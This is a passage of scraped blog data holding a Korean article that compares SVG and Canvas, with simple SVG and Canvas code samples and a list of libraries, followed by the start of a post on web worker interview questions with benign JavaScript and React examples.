있습니다.\n\n<div class=\"content-ad\"></div>\n\nSVG는 복잡한 모양과 상호 작용을 생성하는 기능이 제한적이며 이미지를 구성하는 개별 요소를 변형하고 조작하기 위해 DOM 기반 시스템에 의존하기 때문에 한계가 있습니다. 또한 대량의 데이터를 효율적으로 처리할 수 없기 때문에 SVG는 매우 다이내믹한 애니메이션을 만드는 데 적합하지 않습니다.\n\n한편 Canvas는 이미지를 더 직접적으로 렌더링하고 복잡한 모양에 더 적합합니다. 또한 SVG보다 빠르며 빠른 애니메이션에 적합합니다. 다만 Canvas는 SVG보다 DOM 기반 구조가 없어 그래픽을 조작하는 데 효과적이지 않습니다. 또한 Canvas가 제공하는 제한된 접근성 지원으로 모든 사용자에게 콘텐츠에 액세스를 보장하기가 더 어렵습니다.\n\n# 비교: SVG 대 Canvas\n\n이 섹션에서는 SVG와 Canvas를 자세히 비교해보겠습니다. 이 섹션에서 많은 것을 배울 수 있습니다. 확장성, 크기 및 로드 시간, 상호 작용, 성능, 접근성, 학습 곡선 및 인기를 기준으로 비교할 것입니다.\n\n<div class=\"content-ad\"></div>\n\n# 확장성\n\n가장 인기 있는 두 벡터 그래픽 표준은 SVG와 Canvas입니다. 두 표준 모두 벡터 그래픽을 만드는 데 사용되지만 같지는 않습니다. 이 글에서는 SVG와 Canvas의 확장성을 비교할 것입니다.\n\n**SVG**  \nSVG의 확장성은 일반적으로 벡터 그래픽을 만들기에는 Canvas보다 우수하다고 여겨집니다. SVG는 해상도에 독립적인 벡터 그래픽 형식이기 때문에 품질을 잃지 않고 확대 또는 축소할 수 있습니다. 추가로 상호 작용과 애니메이션을 지원할 수 있습니다.\n\n**Canvas**  \n반면에 Canvas는 해상도에 독립적인 래스터 그래픽 형식입니다. 이는 SVG만큼 쉽게 조절할 수 없기 때문에 그래픽이 확대되면 품질이 저하됩니다. Canvas에는 필터와 마스크와 같은 효과를 지원하는 기능이 내장되어 있지 않습니다.\n\n<div class=\"content-ad\"></div>\n\n# 크기와 로드 시간\n\nSVG와 Canvas를 그래픽 표현에 사용할 때 고려해야 할 다양한 요소가 있습니다. 크기, 로드 시간 및 호환성 등이 그 중 하나입니다.\n\nSVG SVG 파일의 크기가 작기 때문에, 많은 그래픽 콘텐츠가 있는 웹 페이지에 이상적입니다. 또한 텍스트 기반이며 브라우저에서 처리되기 때문에 빨리 로드됩니다. SVG는 모든 최신 브라우저와 호환되지만, 구식 버전과의 하위 호환성을 보장하려면 추가 작업이 필요할 수 있습니다.\n\nCanvas Canvas 요소는 일반적으로 SVG 파일보다 상당히 큽니다. 결과적으로 로드하는 데 시간이 더 걸리고 웹 페이지 성능이 저하될 수 있습니다. 그러나 크기가 불리하더라도 Canvas는 애니메이션 및 상호 작용을 지원하기 때문에 그래픽 표현에 대한 인기가 여전합니다. Canvas도 모든 최신 브라우저와 호환되며, 하위 호환성에 대한 추가 작업이 필요하지 않습니다.\n\n<div class=\"content-ad\"></div>\n\n클라이맥스에서는 크기와 로드 시간 측면에서 SVG가 더 나은 선택입니다. 더 작은 파일 크기와 빠른 로딩 시간 때문에, 그래픽 콘텐츠가 많은 웹 페이지에는 더 나은 선택입니다. 반면에 캔버스는 애니메이션 및 상호작용과 같은 보다 고급 기능이 필요할 때 더 나은 선택일 수 있습니다.\n\n# 상호작용\n\nSVG와 캔버스를 비교하는 것은 이 두 가지 강력한 기술 사이의 차이를 이해하는 핵심 단계입니다. SVG와 캔버스 모두 이차원 그래픽을 만드는 데 사용되지만, 상호작용 측면에서는 큰 차이가 있습니다.\n\nSVG는 선언적 언어의 한 예로, 요소와 해당 동작을 코드 내에서 직접 정의할 수 있습니다. 이를 통해 개발자들은 벡터 그래픽에 상호작용 요소를 손쉽게 통합할 수 있습니다. 예를 들어, 개발자들은 SVG 요소에 여러 이벤트를 바인딩할 수 있으며, 마우스 클릭, 키 입력 및 기타 사용자 상호작용과 같은 것들입니다. 게다가 SVG는 다양한 애니메이션 효과를 지원하며, 이를 활용하여 동적이고 매력적인 사용자 경험을 만들 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n캔버스는 절차 지향 언어로, 개발자로부터 원하는 동작을 수행하도록 지시를 필요로 합니다. 이로 인해 상호 작용적인 작업에 대해 사용하기가 어려워지며, 개발자들은 각 요소에 대한 해당 동작을 수동으로 코딩해야 합니다. 그러나 캔버스는 SVG보다 몇 가지 장점을 가지고 있습니다. 비트맵 이미지를 그리고 3D 효과를 생성할 수 있는 기능이 있습니다.\n\n# 성능\n\nSVG와 캔버스의 성능을 대조할 때 고려해야 할 다양한 요소가 있습니다. 확장 가능한 벡터 그래픽인 SVG는 XML을 기반으로 하는 벡터 이미지 형식입니다. 이는 오픈 표준이므로 누구나 SVG 파일을 생성하고 활용할 수 있습니다. JavaScript API를 사용하여 상호 작용 이미지, 애니메이션 및 게임을 만들 수 있습니다. 이는 HTML5 요소 중 하나인 캔버스를 이용하여 가능합니다.\n\n일반적으로 모양과 간단한 그림에 대한 성능 면에서 SVG가 캔버스보다 우월합니다. SVG 파일은 해상도에 독립적이므로 품질을 희생하지 않고 크기를 조정할 수 있습니다. 게다가 SVG 이미지는 브라우저의 메모리에 캐시될 수 있어 로딩 시간을 단축시킬 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n캔버스는 보통 복잡한 그림과 애니메이션에 대해 더 나은 성능을 발휘합니다. 캔버스를 사용하면 이미지를 빠르게 그리고 품질 손실 없이 그릴 수 있습니다. 게다가 JavaScript API는 캔버스 조작을 최적화하여 더 빠른 애니메이션을 가능하게 합니다. 마지막으로, 어떤 사용 사례에 따라 다릅니다. 형태와 간단한 그림을 다룬다면 SVG를 선택하는 것이 좋습니다. 캔버스는 보다 복잡한 그림과 애니메이션에 대한 더 나은 선택일 수 있습니다.\n\n# 접근성\n\n접근성 측면에서 SVG와 캔버스는 둘 다 유효한 옵션입니다. 이 섹션에서는 SVG와 캔버스의 접근성에 대해 이야기하겠습니다.\n\nSVG는 벡터 기반 기술로, 해상도에 독립적입니다. 이것은 이미지가 다양한 화면 크기로 자동 조정되므로 반응형 웹사이트에 이상적입니다. SVG 이미지는 텍스트 기반이므로 기본적으로 접근할 수 있으며, 화면 판독기로 읽힐 수 있습니다. 개발자는 또한 SVG 코드의 요소에 속성을 추가하여 더 많은 접근성을 확보할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n캔버스는 해상도에 따라 달라지는 래스터 기반 기술입니다. 그 결과, 캔버스 이미지는 고해상도 장치에서 더 잘 보입니다. 캔버스 이미지는 기본적으로 접근할 수 없지만 개발자가 ARIA 속성을 사용하여 접근 가능하게 만들 수 있습니다. 이러한 속성은 페이지의 모든 상호작용 요소에 적용되어야 합니다.\n\n요약하면, SVG와 캔버스는 모두 적절한 코딩으로 접근 가능하게 만들 수 있는 웹 그래픽 옵션입니다. 적합한 기술은 사용하려는 그래픽의 유형과 장치에 따라 결정됩니다.\n\n# 학습 곡선\n\n캔버스와 SVG(확장 가능한 벡터 그래픽) 학습 곡선은 사용자가 프로그래밍 원칙에 얼마나 익숙한지에 따라 크게 달라질 수 있습니다. 캔버스는 JavaScript에 의존하고 다양한 함수와 구문을 이해해야 하기 때문에 SVG보다 복잡하다고 여겨집니다. 사용자는 캔버스에 그림을 그리기 위해 스타일링, 속성 및 그리기 함수와 같은 개념을 이해해야 합니다.\n\n<div class=\"content-ad\"></div>\n\nSVG는 반면에 Canvas보다 덜 복잡하다고 여겨지지만, 마크업 구조와 구문에 대한 이해가 필요합니다. 예를 들어, SVG 모양을 만들려면 path, line 및 rest와 같은 속성 및 요소에 대한 지식이 필요합니다. 두 기술 간의 또 다른 중요한 차이점은 SVG가 웹 표준에 대해 더 많은 지원을 제공한다는 것이며, Canvas는 접근성 기능에 대한 제한적인 지원을 가지고 있습니다.\n\n요약하면, Canvas와 SVG의 학습 곡선은 사용자의 프로그래밍 지식과 마크업 구조에 따라 결정됩니다. Canvas와 SVG 작업은 더 많은 경험을 가진 사람들에게는 간단할 수 있습니다. 그러나 프로그래밍 경험이 없는 사람들에게는 두 기술의 기초를 배우는 것이 더 많은 노력을 필요로 할 수 있습니다.\n\n# 인기\n\nCanvas와 SVG는 상호작용적인 웹 콘텐츠를 만드는 도구로서 점점 더 인기를 얻고 있습니다. Canvas와 SVG는 모두 공개 표준 웹 그래픽 기술입니다. 두 기술 모두 장단점이 있으므로 어떤 것을 사용할지 결정하기 전에 두 기술 간의 차이를 이해하는 것이 중요합니다.\n\n<div class=\"content-ad\"></div>\n\n대부분의 현대 브라우저에서 캔버스를 지원하며 사용하기 쉽습니다. 캔버스의 주요 장점은 그래픽과 애니메이션을 빠르고 쉽게 생성할 수 있다는 것입니다. 그러나 캔버스는 SVG만큼 유연하지 않고 제한된 애니메이션만 지원합니다.\n\nSVG는 캔버스보다 강력하고 유연하여 세밀하고 복잡한 그래픽을 만들 수 있습니다. SVG는 애니메이션과 상호 작용 요소도 지원하여 복잡하고 인터랙티브한 웹 디자인을 위한 뛰어난 선택지입니다. 또한 SVG는 캔버스보다 접근성이 더 높습니다. 왜냐하면 스크린 리더가 읽을 수 있기 때문입니다.\n\n# SVG와 캔버스의 응용 사례\n\nSVG와 캔버스는 각각 벡터 및 래스터 그래픽을 렌더링하는 HTML5 API입니다. SVG는 벡터 기반 그래픽을 만드는 데 사용되며 캔버스는 벡터 및 래스터 그래픽을 렌더링할 수 있습니다. 캔버스는 SVG보다 그래픽을 빠르게 렌더링하고 제한적인 제어만 가능합니다. SVG의 한 가지 응용 사례는 웹 사이트에서 사용할 대화식 지도 시스템을 만드는 것일 수 있습니다. 벡터 형식이기 때문에 사용자는 지도를 확대 및 축소할 때 픽셀화나 왜곡 없이 볼 수 있습니다. 또한 SVG는 부드러운 애니메이션을 지원하여 지도 상의 움직임을 효과적으로 표현할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n캔버스는 많은 제어력과 유연성을 제공하기 때문에 게임을 렌더링하는 데 사용할 수 있어요. 예를 들어, 캔버스는 게임의 환경, 캐릭터, 그리고 애니메이션을 렌더링하는 데 사용될 수 있어요. 또한 물리 시뮬레이션과 인공지능 계산에도 사용될 수 있어요.\n\nSVG와 캔버스는 웹사이트에 데이터 시각화를 만드는 데도 사용될 수 있어요. SVG는 자세한 차트를 만드는 데 더 좋고, 캔버스는 빠르게 차트를 만들고 더 적은 제어로 만드는 데 더 좋아요.\n\n# SVG와 캔버스를 사용할 때의 권장 사항\n\nSVG와 캔버스는 인터넷 상에서 그래픽을 만들고 그리는 데 사용되는 두 가지 웹 기술이에요. 캔버스는 일반적으로 그래픽, 애니메이션, 게임을 만드는 데 사용되고, SVG는 보다 확장 가능한 벡터 그래픽을 만드는 데 주로 사용돼요. SVG와 캔버스 중 어느 것을 선택할 지 결정할 때 그래픽의 복잡성을 고려하는 것이 중요해요. SVG는 모양과 로고와 같은 간단한 그래픽을 만드는 데 가장 효율적이에요. 또한 다수의 해상도로 확장 가능성을 유지하면서 성능을 향상시킬 수 있는 최상의 선택이에요. 반면에 캔버스는 동적이고 상호작용하는 그래픽에 가장 적합해요. 이는 애니메이션을 만들거나 비디오를 보여주거나 상호작용하는 게임을 개발하는 데 포함돼요. 캔버스는 또한 복잡한 그래픽이나 다수의 객체를 다룰 때 더 효율적이에요. SVG는 간단한 그래픽에 더 적합하고, 캔버스는 복잡하고 동적이며 상호작용적인 그래픽에 더 적합해요.\n\n<div class=\"content-ad\"></div>\n\n# SVG와 캔버스의 주요 차이점 요약\n\n웹사이트용 그래픽을 만들 때, SVG(Scalable Vector Graphics)와 캔버스(Canvas) 두 가지 인기있는 기술이 있습니다. 이 두 기술 간의 주요 차이점은 SVG가 기하학적 모양을 사용하여 그래픽을 렌더링하는 반면 캔버스는 픽셀을 사용한다는 것입니다. 이는 SVG 그래픽이 해상도에 독립적이어서 품질을 잃지 않고 크기를 조정할 수 있지만, 캔버스 그래픽은 크기를 조정할 때 흐릿하고 왜곡되는 문제가 발생한다는 것을 의미합니다.\n\n또한, SVG는 공식 마크업 언어로 구성되어 복잡한 그래픽을 만드는 것이 더 쉽지만, 캔버스는 더 복잡한 이미지를 그리기 위해 JavaScript 지식이 필요합니다. SVG는 정적 이미지와 애니메이션에 더 적합하며, 캔버스는 게임이나 실시간 응용프로그램과 같은 동적 그래픽을 만드는 데 더 적합합니다. 결론적으로, SVG와 캔버스는 웹사이트에서 그래픽을 만드는 데 사용되는 두 가지 다른 기술이며, SVG는 해상도에 독립적이고 공식 마크업 언어로 구성되어 있으며, 캔버스는 픽셀로 구성되어 JavaScript 지식이 필요합니다. 각 도구에는 장단점이 있으므로 프로젝트의 특정 목표에 따라 선택이 결정될 것입니다.\n\n# SVG에는 어떤 모양이 있나요?\n\n<div class=\"content-ad\"></div>\n\nSVG를 통해 다양한 모양을 만들 수 있습니다. 모양을 만드는 방법은 전적으로 여러분에 달려 있어요. SVG는 다음과 같은 모양을 생성하는 데 사용할 수 있습니다:\n\n- 사각형\n- 다각형\n- 텍스트\n- 원\n- 다각선\n- 타원\n- 선\n- 경로\n\n모양의 점 속성을 사용하면 여전히 다른 종류의 모양을 만들 수 있어요. 이 점 속성은 다각형과 함께 사용될 때 완벽하게 작동합니다.\n\n# SVG에 사용할 수 있는 스타일링은 무엇이 있을까요?\n\n<div class=\"content-ad\"></div>\n\n이 섹션에서는 도형을 만들 때 SVG를 사용할 때 사용할 수있는 스타일 옵션에 대해 다룰 예정입니다. SVG를 사용하려면 이러한 스타일을 사용해야합니다. SVG는 다음과 같은 여러 방법으로 스타일을 적용할 수 있습니다:\n\n- 스타일 속성\n\n  스타일 속성을 사용하여 SVG 요소에 CSS 스타일을 적용할 수 있습니다. 예를 들어 CSS 속성을 사용하여 채우기 색상, 테두리 색상, 테두리 너비, 불투명도 등을 변경할 수 있습니다.\n\n아래는 코드에서 스타일 속성을 사용하는 방법을 보여주는 그림입니다:\n\n<div class=\"content-ad\"></div>\n\n```md\n<svg>\n  <polygon style=\"fill: cornflowerblue; stroke: red; stroke-width: 5\" />\n</svg>\n```\n\n위 코드에서 스타일 속성 값에 포함된 것들이 다같이  다각형 모양에 적용될 스타일 입니다. 위 SVG 코드에서 사용된 스타일 설명은 아래에서 확인할 수 있습니다.\n\n- fill 속성은 모양의 배경색에만 영향을 미칩니다.\n- SVG에서 만들어질 윤곽선의 색은 stroke 속성을 사용하여 설정됩니다.\n- 윤곽선 너비를 설정하려면 스타일에 stroke-width 속성을 추가하면 됩니다.\n\n# CSS 클래스\n\n<div class=\"content-ad\"></div>\n\nCSS 클래스를 활용하면 특정 스타일링이 적용된 클래스를 생성하고 해당 클래스를 CSS의 class 속성을 사용하여 SVG 요소에 적용할 수 있습니다.\n\n## Inline CSS\n\nstyle 속성을 사용하여 속성에 직접 스타일을 지정함으로써 인라인 CSS를 사용하여 SVG 요소에 스타일을 적용할 수도 있습니다.\n\n## 프리젠테이션 속성\n\n<div class=\"content-ad\"></div>\n\nSVG에서 프레젠테이션 속성을 사용하면 요소에 스타일을 직접 적용할 수 있어요. 예를 들어 `rect` 요소는 \"fill\" 속성을 설정하여 채우기 색상을 지정할 수 있어요.\n\n# 외부 스타일시트\n\n`link` 요소를 사용하여 외부 CSS 스타일시트에서 스타일을 정의하고 SVG에 연결할 수 있어요.\n\nSVG는 자주 사용되는 채우기, 외곽선, 선 두께, 불투명도, 변환 등과 같은 스타일링 요소를 사용해요. SVG는 그라데이션, 필터, 마스크와 같이 고급 기능을 사용하여 스타일을 적용할 수도 있어요.\n\n<div class=\"content-ad\"></div>\n\n# SVG로 모양 만드는 방법\n\nHTML에서 SVG를 생성하는 과정은 몇 줄의 코드만 필요한 간단한 과정입니다. `svg` 요소를 만들고, SVG 그림의 크기를 지정한 다음 `svg` 요소 내에 모양, 텍스트 및 다른 요소를 추가하면 됩니다.\n\n## 정사각형과 직사각형\n\n먼저 `svg` 요소를 만들고, 그림 캔버스의 크기를 지정합니다. 이는 `svg` 요소에 너비와 높이 속성을 추가하여 수행됩니다. 속성 '너비'와 '높이'는 픽셀 단위로 지정됩니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\n<svg width=\"200\" height=\"200\"></svg>\n```\n\n그런 다음 `svg` 요소 내에 모양, 텍스트 및 기타 요소를 추가하세요. 이는 알맞은 모양 및 텍스트 요소를 `svg` 요소 내부에 포함시켜 수행됩니다. 예를 들어 사각형 또는 정사각형을 만들려면 `rect` 요소를 사용하세요:\n\n```js\n<svg width=\"200\" height=\"200\">\n  <rect x=\"10\" y=\"10\" width=\"50\" height=\"50\" />\n</svg>\n\n<svg width=\"400\" height=\"110\">\n  <rect\n    width=\"300\"\n    height=\"100\"\n    style=\"fill: rgb(0, 0, 255); stroke-width: 3; stroke: rgb(0, 0, 0)\"\n  />\n</svg>\n```\n\n출력:\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_1.png\" />\n\n이 섹션에서는 SVG를 사용하여 다양한 모양을 만들 것입니다. 이 모양들은 매우 쉽고 어렵지 않으니 시작해 봅시다.\n\n## 원\n\n원소는 매우 간단한 원을 만드는 데 사용할 수 있습니다. SVG에서 원에 적용될 속성은 다음과 같습니다:\n\n<div class=\"content-ad\"></div>\n\n- cy: cy 속성은 원의 Y 좌표를 나타냅니다.\n- cx: X 좌표를 설정할 때는 cx 속성을 사용해주세요.\n- stroke: 원의 테두리 색상을 변경하려면 stroke 속성을 사용하세요.\n- stroke-width: stroke-width 속성을 사용하여 원의 테두리 너비를 지정할 수 있습니다.\n\nSVG를 사용하여 원을 그려봅시다:\n\n`![SVGVsCanvasAComparison_2](/assets/img/2024-05-02-SVGVsCanvasAComparison_2.png)`\n\n코드:\n\n<div class=\"content-ad\"></div>\n\n```js\n<svg height=\"100\" width=\"100\">\n  <circle\n    cx=\"50\"\n    cy=\"50\"\n    r=\"40\"\n    stroke=\"cornflowerblue\"\n    stroke-width=\"3\"\n    fill=\"gray\"\n  />\n</svg>\n```\n\n## Polygon\n\n단순히 SVG의 `polygon` 요소를 사용하여 다각형을 만들 수 있습니다. SVG 다각형 요소를 사용하여 다각형 모양을 만들 수 있습니다.\n\n다각형을 생성해 봅시다:\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_3.png\" />\n\n코드:\n\n```js\n<svg height=\"250\" width=\"500\">\n  <polygon\n    points=\"220,10 300,210 170,250 123,234\"\n    style=\"fill: cornflowerblue; stroke: red; stroke-width: 4\"\n  />\n</svg>\n```\n\n상기 코드에서 `polygon` 요소는 `svg` 요소 내부에서 사용되었습니다. 그리고 우리는 다각형 요소 내부의 점 속성을 활용했습니다. 다각형 모양의 x와 y 좌표는 point 속성에 의해 지정됩니다.\n\n<div class=\"content-ad\"></div>\n\n`polygon` 요소를 사용하여 각 코너의 x 및 y 좌표를 설정하는 points 속성을 사용하여, 빠르게 별을 생성할 수 있습니다.\n\n![Star Shape](/assets/img/2024-05-02-SVGVsCanvasAComparison_4.png)\n\n코드:\n\n```js\n<svg height=\"210\" width=\"500\">\n  <polygon\n    points=\"100,10 40,198 190,78 10,78 160,198\"\n    style=\"\n      fill: cornflowerblue;\n      stroke: red;\n      stroke-width: 5;\n      fill-rule: nonzero;\n    \"\n  />\n</svg>\n```\n\n<div class=\"content-ad\"></div>\n\n## 텍스트\n\nSVG를 사용하여 텍스트를 손쉽게 작성할 수 있어요. 그런 사실을 알고 계셨나요? 아주 간단하게 텍스트를 작성할 수 있죠. 그러면 시작해봅시다!\n\n![image not found](/assets/img/2024-05-02-SVGVsCanvasAComparison_5.png)\n\n코드:\n\n<div class=\"content-ad\"></div>\n\n```js\n<svg width=\"\">\n  <text x=\"100\" y=\"100\" fill=\"cornflowerblue\">WELCOME TO OPEN REPLAY</text>\n</svg>\n```\n\n위 코드에서는 X 및 Y 속성을 사용하여 텍스트를 위치시키고, 텍스트에 cornflowerblue라는 색상을 부여하기 위해 fill 속성을 사용했습니다.\n\n## SVG 이미지\n\n마지막으로 `img` 요소 내에 SVG를 포함시킴으로써 HTML 페이지에 통합할 수 있습니다. SVG 파일의 URL은 `img` 요소의 src 속성에 있어야 합니다.```\n\n<div class=\"content-ad\"></div>\n\n```js\n<img src=\"/image.svg\" width=\"500px\" alt=\"\" />\n```\n\n출력:\n\n<img src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_6.png\" />\n\n위의 단계를 따라 간단히 HTML에서 SVG를 만들 수 있습니다. 더 많은 SVG 이미지를 원하시면 여기를 클릭해주세요.\n\n<div class=\"content-ad\"></div>\n\n# 캔버스를 사용하여 모양 만들기\n\nHTML 캔버스는 꽤 간단하게 만들 수 있어요. HTML5 캔버스 요소는 HTML 파일에 있어야 하며 필요한 속성이 있어야 해요. 먼저 캔버스 요소를 선언하고 높이와 너비를 지정해야 해요. 이를 위해 HTML 문서에 `canvas`라는 올바른 속성이 포함된 요소를 추가하는 걸로 할 수 있어요.\n\n```js\n<canvas id=\"myCanvas\" width=\"500\" height=\"500\"></canvas>\n```\n\n캔버스 요소를 HTML 요소로 추가한 후 상호 작용할 수 있도록 JavaScript 코드가 포함되어 있어야 해요. getContext() 메소드를 사용하여 이 작업을 수행해야 해요. 이렇게 하면 캔버스 드로잉 API에 액세스할 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n```js\n바로 캔버스 그리기 API에 접근할 수 있으면 그리기를 시작할 수 있어요. 그리기 API의 메서드를 사용하여 캔버스에 모양, 선, 텍스트 및 그라데이션을 그릴 수 있어요. fillStyle 속성을 사용하면 그려진 모양의 색상을 변경할 수도 있어요.\n\nctx.fillStyle = \"#FF0000\";\nctx.fillRect(20, 20, 150, 100);\n```\n\n출력:\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_7.png\" />\n\n캔버스 요소가 준비되었고 그림 그리기 API가 활성화되어 있으므로 이제 캔버스 기반 프로젝트를 개발할 수 있습니다.\n\nHTML 캔버스에 대해 더 알고 싶다면 MDN 웹 문서를 방문해보세요.\n\n# 캔버스에서 이미지를 만드는 데 도움이 되는 상위 10개 라이브러리\n\n<div class=\"content-ad\"></div>\n\n코딩이나 그래픽 디자인 경험이 많이 없는 사람들을 위해 라이브러리는 Canvas에서 이미지를 만들고 조작하는 것을 간단하게 만들어줍니다. 많은 라이브러리의 간단한 API를 사용해 시작하기 쉽습니다. 아래는 Canvas에서 이미지를 만드는 데 도움이 되는 상위 10개 라이브러리입니다:\n\n- Fabric.js는 HTML5 캔버스에서 이미지를 만들고 편집하기 위한 다양한 도구 세트를 제공하는 JavaScript 라이브러리입니다. 간단하고 강력하며 여러 형태, 텍스트, 패턴과 같은 다양한 이미지 구성 요소를 지원합니다.\n- Konva.js는 웹 브라우저 내에서 고성능 대화식 2D 그래픽을 만들기 위해 특별히 설계된 라이브러리입니다. 다양한 이미지 형식을 처리할 수 있고 다양한 그리기 도구와 애니메이션을 제공합니다.\n- D3.js는 데이터 시각화용으로 자주 사용되는 Canvas에서 동적이고 대화식 이미지를 만드는 잘 알려진 라이브러리입니다. 축과 모양과 같은 간단한 요소뿐만 아니라 더 복잡한 이미지를 그릴 수 있습니다.\n- EaselJS는 HTML5 캔버스에서 빠르고 쉬운 이미지 조작을 가능하게 하는 JavaScript 라이브러리입니다. 다양한 기능 중에서 모양, 텍스트, 애니메이션 등이 있습니다.\n- Paper.js는 Canvas에서 복잡하고 대화식 이미지를 생성할 수 있는 벡터 그래픽 라이브러리입니다. 곡선, 경로, 모양 작업을 위한 다양한 도구를 포함하고 있습니다.\n- Snap.svg는 웹 기반 SVG 이미지 조작을 위한 JavaScript 라이브러리입니다. 간단하게 사용할 수 있으며 간단한 벡터 그래픽 조작이 가능합니다.\n- Three.js는 Canvas에서 멋진 3D 이미지를 만들고 높은 상호 작용을 제공하는 3D 그래픽 라이브러리입니다. 재료, 텍스처, 조명 작업을 위한 다양한 도구를 제공합니다.\n- Phaser는 Canvas를 사용하는 HTML5 게임을 만들기 위한 프레임워크입니다. 오디오, 애니메이션, 물리 엔진과 같은 다양한 이미지 관리 도구를 제공합니다.\n- Chart.js는 동적이고 대화식 캔버스 차트를 만들기 위한 인기 있는 라이브러리입니다. 막대, 선, 파이 차트 등 다양한 차트 유형을 제공합니다.\n- Create.js는 웹 사이트를 위한 풍부한 시각 요소와 상호 작용 그래픽 및 애니메이션을 만들기 위해 사용되는 JavaScript 라이브러리들의 모음입니다.\n\n# 결론\n\nSVG와 Canvas의 비교가 재미있었기를 바랍니다. 이 경쟁에서 명확한 우승자는 없습니다. SVG와 Canvas 모두 장단점이 있으며 최적의 옵션은 프로그래밍 배경과 프로젝트의 목표 및 사양에 따라 다를 것입니다. 간단한 그래픽을 만드는 데 SVG를 사용해 왔고 고급 그래픽이나 2D 게임을 만들어 보고 싶다면 Canvas를 시도해 볼 수 있을 것입니다.\n\n<div class=\"content-ad\"></div>\n\nhttps://blog.openreplay.com에서 원문이 게시되었습니다.","ogImage":{"url":"/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png"},"coverImage":"/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png","tag":["Tech"],"readingTime":16},{"title":"웹 워커 관련 프론트엔드 면접 질문","description":"","date":"2024-05-02 00:08","slug":"2024-05-02-WebWorkersInterviewQuestions","content":"\n\n주제 안내:\n\n# 웹 워커:\n\n웹 워커는 브라우저 기능의 일부입니다. 현재 페이지의 백그라운드에서 생성될 수 있는 실제 OS 스레드로, 복잡하고 자원 집약적인 작업을 수행할 수 있습니다.\n\n서버에서 대량의 데이터를 가져와야 하거나 UI에 복잡한 렌더링이 필요한 경우를 상상해보세요. 이를 직접 웹페이지에서 처리한다면 페이지가 더 부드럽지 않을 수 있고 UI에 영향을 줄 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n위 웹 워커를 사용하여 이 문제를 완화할 수 있어요. 웹 워커는 웹 워커라 불리는 쓰레드를 만들고, 그 웹 워커가 복잡한 작업을 처리하도록 할 수 있어요.\n\n웹 워커와 간단하게 소통할 수 있으며, 이를 통해 워커와 UI 간에 데이터를 주고받을 수 있어요.\n\n아래는 웹 워커의 주요 기능 몇 가지에요:\n\n- 웹 워커는 쓰레드 기반의 JavaScript입니다.\n- 웹 워커는 더 많은 공간과 CPU 시간을 요구해요.\n- 웹 워커는 웹사이트의 속도를 향상시켜 줘요.\n- 웹 워커는 클라이언트 측에서 코드를 실행해요 (서버 측이 아니에요).\n- 웹 워커 쓰레드는 postMessage() 콜백 메서드를 사용하여 서로 소통해요.\n\n<div class=\"content-ad\"></div>\n\n웹 워커의 일반적인 예시는 다음과 같습니다:\n\n- 주식 가격, 실시간 활성 사용자 등의 실시간 데이터를 표시하는 대시보드 페이지\n- 서버에서 큰 파일을 가져오는 작업\n- 자동 저장 기능\n\n## 웹 워커 생성 구문\n\n```js\n웹 워커 생성을 위해 사용됩니다\nworker = new Worker(\"webWorker.js\");\n```\n\n<div class=\"content-ad\"></div>\n\n## 웹 워커 종료하는 구문\n\n```js\n// 웹 워커를 종료하는 데 사용됩니다.\nworker.terminate();\n```\n\n```js\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>웹 워커 예제</title>\n</head>\n<body>\n  <h1>웹 워커 예제</h1>\n  <button onclick=\"startWorker()\">워커 시작</button>\n  <p id=\"result\"></p>\n\n  <script>\n    function startWorker() {\n      const worker = new Worker('worker.js');\n      \n      worker.onmessage = function(event) {\n        document.getElementById('result').textContent = event.data;\n      };\n    }\n  </script>\n</body>\n</html>\n```\n\n```js\nfunction doHeavyTask() {\n  // 무거운 CPU 작업을 시뮬레이션합니다.\n  let result = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    result += i;\n  }\n  return result;\n}\n\n// 메인 스레드로부터 메시지를 수신합니다.\nonmessage = function(event) {\n  const heavyResult = doHeavyTask();\n  postMessage(heavyResult); // 결과를 메인 스레드로 다시 보냅니다.\n};\n```\n\n<div class=\"content-ad\"></div>\n\n## React 예제, WebWorker Websocket 예제\n\n```js\nconst Homepage = () => {\n  const [worker, setWorker] = useState(null);\n  const [res, setRes] = useState([]);\n  const [log, setLog] = useState([]);\n  const [buttonState, setButtonState] = useState(false);\n\n  const hanldeStartConnection = () => {\n    // 워커에 메시지 보내기 [postMessage]\n    worker.postMessage({\n      connectionStatus: \"init\",\n    });\n  };\n\n  const handleStopConnection = () => {\n    worker.postMessage({\n      connectionStatus: \"stop\",\n    });\n  };\n \n //UseEffect1\n  useEffect(() => {\n    const myWorker = new Worker(\n      new URL(\"../workers/main.worker.js\", import.meta.url)\n    ); //NEW SYNTAX\n    setWorker(myWorker);\n\n    return () => {\n      myWorker.terminate();\n    };\n  }, []);\n\n //UseEffect2\n  useEffect(() => {\n    if (worker) {\n      worker.onmessage = function (e) {\n        if (typeof e.data === \"string\") {\n          if(e.data.includes(\"[\")){\n            setLog((preLogs) => [...preLogs, e.data]);\n          } else {\n            setRes((prevRes) => [...prevRes, { stockPrice: e.data }]);\n          }\n        }\n\n        if (typeof e.data === \"object\") {\n          setButtonState(e.data.disableStartButton);\n        }\n      };\n    }\n  }, [worker]);\n\n  return (\n    <>\n      <div className=\"stats\">\n        <div className=\"control-panel\">\n          <h3>WebWorker Websocket 예제</h3>\n          <button\n            id=\"start-connection\"\n            onClick={hanldeStartConnection}\n            disabled={!worker || buttonState}\n          >\n            연결 시작\n          </button>\n          &nbsp;\n          <button\n            id=\"stop-connection\"\n            onClick={handleStopConnection}\n            disabled={!buttonState}\n          >\n            연결 중지\n          </button>\n        </div>\n        <LineChartComponent data={res} />\n      </div>\n      <Logger 